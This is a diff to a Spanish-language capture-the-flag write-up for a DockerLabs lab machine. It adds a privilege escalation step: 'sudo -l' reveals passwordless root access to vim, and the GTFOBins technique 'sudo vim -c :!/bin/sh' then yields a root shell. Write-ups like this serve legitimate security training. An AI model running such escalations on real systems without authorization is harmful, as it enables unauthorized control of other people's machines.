@@ -218,16 +218,26 @@ russoski@9cc448a7c0a7:~$ whoami
 russoski
 ``` 
 
-Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
+Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
 ```ruby
-lovely@90f44a27e698:~$ sudo -l
--bash: sudo: command not found
-```
-Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
-* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
-* Tu usuario no tiene permisos para sudo, o sudo no está instalado.
+russoski@9cc448a7c0a7:~$ sudo -l
+Matching Defaults entries for russoski on 9cc448a7c0a7:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
+User russoski may run the following commands on 9cc448a7c0a7:
+    (root) NOPASSWD: /usr/bin/vim
+```
+Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
+![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
+```ruby
+russoski@9cc448a7c0a7:~$ sudo vim -c ':!/bin/sh'
+
+# whoami
+root
+# 
+```
+🥳CONSEGUIDO, SOMOS ROOT🥳
+[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
 
 
 
